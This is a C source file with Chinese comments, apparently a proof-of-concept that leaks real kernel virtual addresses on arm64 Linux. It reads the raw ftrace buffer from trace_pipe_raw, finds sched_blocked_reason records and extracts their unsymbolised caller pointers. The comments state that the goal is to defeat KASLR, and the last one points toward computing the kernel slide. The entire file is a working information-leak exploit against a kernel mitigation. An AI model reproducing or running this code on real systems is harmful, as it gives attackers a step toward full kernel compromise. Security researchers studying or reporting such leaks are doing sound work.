// trace_raw_leak.c —— 从 trace_pipe_raw 里挖 sched_blocked_reason 的真实内核地址
//
// 原理：
//   /sys/kernel/tracing/trace 用 %pS 符号化（caller=worker_thread+0x9c/0x334），
//   看不到真实地址。但 trace_pipe_raw 输出的是内核 ftrace ring buffer 的原始
//   二进制记录，其中 sched_blocked_reason 的 caller 字段（offset 16, size 8）
//   是未符号化的真实内核虚拟地址 → 破 KASLR。
//
// 事件 format（本机 ID=109）:
//   offset 0  : u16  common_type (event id)
//   offset 2  : u8   common_flags
//   offset 3  : u8   common_preempt_count
//   offset 4  : int  common_pid
//   offset 8  : pid_t pid
//   offset 16 : void* caller        ← 真实内核地址
//   offset 24 : bool  io_wait
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define EVENT_ID 109   /* sched_blocked_reason，从 format 读到 */
#define CALLER_OFF 16

static int is_kernel_addr(uint64_t v)
{
    /* arm64 内核虚拟地址通常是 0xffffffc0xxxxxxxx 或 0xffffff80xxxxxxxx */
    return (v >> 32) == 0xffffffc0ULL || (v >> 32) == 0xffffff80ULL ||
           (v >> 24) == 0xffffffc0ULL || (v >= 0xffff000000000000ULL);
}

int main(int argc, char **argv)
{
    const char *path = "/sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw";
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0) {
        printf("open %s 失败: errno=%d(%s)\n", path, errno, strerror(errno));
        return 1;
    }

    static unsigned char buf[1 << 20];   /* 1 MB */
    ssize_t n = read(fd, buf, sizeof(buf));
    printf("read raw = %zd 字节  errno=%d(%s)\n", n, errno, strerror(errno));
    close(fd);
    if (n <= 0) return 1;

    /* ftrace raw 格式是每 CPU 的 ring buffer 页片段，记录里找 event id。
       简单扫描：找所有出现 EVENT_ID 作为 u16 的位置，再看 +CALLER_OFF */
    uint64_t addrs[256];
    int cnt = 0;
    for (size_t i = 0; i + 2 + CALLER_OFF + 8 <= (size_t)n; i += 1) {
        uint16_t type = buf[i] | (buf[i + 1] << 8);
        if (type != EVENT_ID) continue;
        uint64_t caller;
        memcpy(&caller, buf + i + CALLER_OFF, 8);
        if (!is_kernel_addr(caller)) continue;
        /* 去重 */
        int dup = 0;
        for (int k = 0; k < cnt; k++) if (addrs[k] == caller) { dup = 1; break; }
        if (!dup && cnt < 256) addrs[cnt++] = caller;
    }

    printf("找到 %d 个疑似内核地址:\n", cnt);
    for (int k = 0; k < cnt; k++)
        printf("  [%3d] 0x%016llx\n", k, (unsigned long long)addrs[k]);

    /* 若拿到地址，尝试反推出可能的 KASLR slide：
       内核静态基址 0xffffffc080000000；worker_thread 静态地址已知则从 vmlinux 取。
       这里只打印地址，slide 计算留给用户态。 */
    return 0;
}
